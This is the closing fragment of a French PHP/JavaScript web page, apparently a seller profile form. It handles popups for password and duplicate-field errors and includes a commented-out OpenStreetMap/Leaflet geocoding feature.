    if (urlParams.has("password_success")) {
        const popup = document.getElementById("popup-success");

        popup.classList.add("show");

        // Disparaît après 1 seconde
        setTimeout(() => {
            popup.classList.remove("show");
        }, 3000);

        // Nettoyage de l'URL
        window.history.replaceState({}, document.title, window.location.pathname);
    }

    function togglePassword(id, iconSpan) {
        const field = document.getElementById(id);
        const img = iconSpan.querySelector("img");

        if (field.type === "password") {
            field.type = "text";
            img.src = "../../../img/svg/oeil-barre.svg"; // icône oeil barré
        } else {
            field.type = "password";
            img.src = "../../../img/svg/oeil.svg"; // icône oeil normal
        }
    }

    // POPUP ERREUR
    const urlParams2 = new URLSearchParams(window.location.search);

    if (urlParams2.has("password_error")) {
        const popup = document.getElementById("popup-error");
        const text = document.getElementById("popup-error-text");

        text.textContent = urlParams2.get("password_error");
        popup.classList.add("show");

        // Disparaît après 3 sec
        setTimeout(() => {
            popup.classList.remove("show");
        }, 3000);

        // Nettoyage URL
        window.history.replaceState({}, document.title, window.location.pathname);
    }

    // ALERT VALEUR EXISTANTE
    if (urlParams.has("error_siren")) {
        alert("Erreur SIREN déjà existant.");
        window.history.replaceState({}, document.title, window.location.pathname);
    }

    if (urlParams.has("error_rsociale")) {
        alert("Erreur Raison sociale déjà existant.");
        window.history.replaceState({}, document.title, window.location.pathname);
    }

    if (urlParams.has("error_pseudo")) {
        alert("Erreur Pseudo déjà existant.");
        window.history.replaceState({}, document.title, window.location.pathname);
    }

    if (urlParams.has("error_email")) {
        alert("Erreur Email déjà existant.");
        window.history.replaceState({}, document.title, window.location.pathname);
    }

    if (urlParams.has("error_num")) {
        alert("Erreur Numéro de téléphone déjà existant.");
        window.history.replaceState({}, document.title, window.location.pathname);
    }

    function showCustomPopup(message, type = 'success') {
        const popupId = type === 'success' ? 'custom-popup-success' : 'custom-popup-error';
        const popup = document.getElementById(popupId);

        if (popup) {
            popup.innerText = message;
            popup.classList.add('show');

            setTimeout(() => {
                popup.classList.remove('show');
            }, 3000);
        }
    }

    <?php if ($notification): ?>
    document.addEventListener('DOMContentLoaded', function() {
        showCustomPopup("<?= addslashes($notification['message']) ?>", "<?= $notification['type'] ?>");

        // On nettoie l'URL pour éviter que la popup revienne au rafraîchissement (F5)
        window.history.replaceState({}, document.title, window.location.pathname);
    });
    <?php endif; ?>
    </script>
    <div id="custom-popup-success" class="popup-success"></div>
    <div id="custom-popup-error" class="popup-error"></div>

    <!-- <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script> -->
    <!-- <script>
    // ============================================================
    // GPS – Géocodage Nominatim (OpenStreetMap) + carte Leaflet
    // ============================================================
    let gpsMap = null;
    let gpsMarker = null;

    const initLat = <?//= !empty($vendeur['latitude'])  ? (float)$vendeur['latitude']  : 'null' ?>;
    const initLon = <?//= !empty($vendeur['longitude']) ? (float)$vendeur['longitude'] : 'null' ?>;

    function updateCoordinates(lat, lon) {
        document.getElementById('latitude').value = parseFloat(lat).toFixed(6);
        document.getElementById('longitude').value = parseFloat(lon).toFixed(6);
    }

    async function reverseGeocode(lat, lon) {
        const url = 'https://nominatim.openstreetmap.org/reverse?format=json&lat=' +
            encodeURIComponent(lat) + '&lon=' + encodeURIComponent(lon) + '&addressdetails=1';
        try {
            const response = await fetch(url, {
                headers: {
                    'Accept-Language': 'fr'
                }
            });
            if (!response.ok) return;
            const data = await response.json();
            if (!data.address) return;
            const a = data.address;
            const numero = a.house_number || '';
            const adresse = a.road || a.pedestrian || a.footway || '';
            const ville = a.city || a.town || a.village || a.hamlet || a.municipality || '';
            const codep = a.postcode ? a.postcode.split(';')[0].trim() : '';
            if (numero) document.getElementById('numero').value = numero;
            if (adresse) document.getElementById('adresse').value = adresse;
            if (ville) document.getElementById('ville').value = ville;
            if (codep) document.getElementById('codep').value = codep;
        } catch (err) {
            console.error('Erreur reverse geocoding :', err);
        }
    }

    function initGPSMap(lat, lon) {
        if (gpsMap !== null) {
            gpsMap.remove();
            gpsMap = null;
            gpsMarker = null;
        }
        // Petit délai pour laisser le DOM rendre le bloc visible
        setTimeout(function() {
            gpsMap = L.map('map').setView([lat, lon], 16);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 19,
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(gpsMap);

            gpsMarker = L.marker([lat, lon], {
                    draggable: true
                })
                .addTo(gpsMap)
                .bindPopup('<b>Votre adresse</b><br>Faites glisser pour ajuster.')
                .openPopup();

            gpsMarker.on('dragend', function() {
                const pos = gpsMarker.getLatLng();
                updateCoordinates(pos.lat, pos.lng);
                reverseGeocode(pos.lat, pos.lng);
            });

            gpsMap.on('click', function(e) {
                gpsMarker.setLatLng(e.latlng);
                updateCoordinates(e.latlng.lat, e.latlng.lng);
                reverseGeocode(e.latlng.lat, e.latlng.lng);
            });
        }, 100);
    }

    // Synchronisation carte ↔ saisie manuelle + reverse geocoding
    let reverseDebounce = null;
    ['latitude', 'longitude'].forEach(function(fieldId) {
        document.getElementById(fieldId).addEventListener('input', function() {
            const lat = parseFloat(document.getElementById('latitude').value);
            const lon = parseFloat(document.getElementById('longitude').value);
            if (isNaN(lat) || isNaN(lon)) return;
            if (lat < -90 || lat > 90 || lon < -180 || lon > 180) return;
            if (gpsMap && gpsMarker) {
                const pos = L.latLng(lat, lon);
                gpsMarker.setLatLng(pos);
                gpsMap.setView(pos, gpsMap.getZoom());
            } else {
                document.getElementById('gps-result').style.display = 'block';
                initGPSMap(lat, lon);
            }
            // Reverse geocoding avec debounce pour éviter trop de requêtes
            clearTimeout(reverseDebounce);
            reverseDebounce = setTimeout(function() {
                reverseGeocode(lat, lon);
            }, 800);
        });
    });

    // Afficher la carte automatiquement si coordonnées déjà enregistrées
    document.addEventListener('DOMContentLoaded', function() {
        if (initLat !== null && initLon !== null) {
            document.getElementById('gps-result').style.display = 'block';
            updateCoordinates(initLat, initLon);
            initGPSMap(initLat, initLon);
        }
    });

    document.getElementById('btn-geolocate').addEventListener('click', function() {
        const btn = this;
        if (!navigator.geolocation) {
            alert('La géolocalisation n\'est pas supportée par ce navigateur.');
            return;
        }
        btn.disabled = true;
        btn.textContent = 'Localisation en cours…';
        navigator.geolocation.getCurrentPosition(
            function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                document.getElementById('gps-result').style.display = 'block';
                updateCoordinates(lat, lon);
                initGPSMap(lat, lon);
                document.getElementById('gps-result').scrollIntoView({
                    behavior: 'smooth',
                    block: 'nearest'
                });
                btn.disabled = false;
                btn.textContent = 'Me géolocaliser';
            },
            function(error) {
                const messages = {
                    1: 'Permission refusée. Autorisez la géolocalisation dans votre navigateur.',
                    2: 'Position introuvable. Vérifiez votre connexion ou réseau.',
                    3: 'Délai dépassé. Réessayez.'
                };
                alert(messages[error.code] || 'Erreur de géolocalisation.');
                btn.disabled = false;
                btn.textContent = 'Me géolocaliser';
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });

    document.getElementById('btn-geocode').addEventListener('click', async function() {
        const numero = (document.getElementById('numero').value || '').trim();
        const adresse = (document.getElementById('adresse').value || '').trim();
        const ville = (document.getElementById('ville').value || '').trim();
        const codep = (document.getElementById('codep').value || '').trim();

        if (!adresse || !ville) {
            alert(
                'Veuillez renseigner au moins l\'adresse et la ville avant de valider les coordonnées GPS.'
            );
            return;
        }

        const queryStr = [numero, adresse, codep, ville, 'France']
            .filter(Boolean).join(', ');
        const url = 'https://nominatim.openstreetmap.org/search?format=json&limit=1&countrycodes=fr&q=' +
            encodeURIComponent(queryStr);

        this.disabled = true;
        this.textContent = 'Recherche en cours…';

        try {
            const response = await fetch(url);
            if (!response.ok) throw new Error('Réponse réseau invalide');
            const data = await response.json();

            if (!data.length) {
                alert('Adresse introuvable. Vérifiez les champs adresse, ville et code postal.');
                return;
            }

            const lat = parseFloat(data[0].lat);
            const lon = parseFloat(data[0].lon);

            document.getElementById('gps-result').style.display = 'block';
            updateCoordinates(lat, lon);
            initGPSMap(lat, lon);

            document.getElementById('gps-result').scrollIntoView({
                behavior: 'smooth',
                block: 'nearest'
            });

        } catch (err) {
            alert('Erreur lors de la géolocalisation. Vérifiez votre connexion.');
            console.error(err);
        } finally {
            this.disabled = false;
            this.textContent = 'Valider les coordonnées GPS';
        }
    });
    </script> -->
</body>

</html>